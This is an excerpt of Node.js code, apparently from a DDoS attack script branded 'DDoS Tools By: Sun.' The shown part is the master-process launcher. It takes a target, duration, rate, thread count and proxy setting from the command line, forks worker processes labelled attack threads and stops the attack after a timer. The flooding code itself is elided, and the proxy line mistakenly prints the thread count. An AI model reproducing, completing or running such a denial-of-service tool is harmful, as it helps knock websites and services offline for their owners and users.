...
if (cluster.isMaster){
  ...
  console.log(`
           ╔═══════════════════════════════════════════════╗
                                     DDoS Tools By: Sun. | Powerful yet DDoS Script
           ╚═══════════════════════════════════════════════╝
`)
  console.log(`[@Sun.] Time: ${getCurrentTime()}`)
  console.log(`------------------------------------------`)
  console.log(`[@Sun.] Target: `+ process.argv[2])
  console.log(`[@Sun.] Time: `+ process.argv[3])
  console.log(`[@Sun.] Rate: `+ process.argv[4])
  console.log(`[@Sun.] Thread: ` + process.argv[5])
  console.log(`[@Sun.] Proxy: ` + process.argv[5])
  console.log(`------------------------------------------`)
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[@Sun.] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[@Sun.] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[@Sun.] ${getCurrentTime()} The Attack Is Over, Now check it if it working or no :)`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
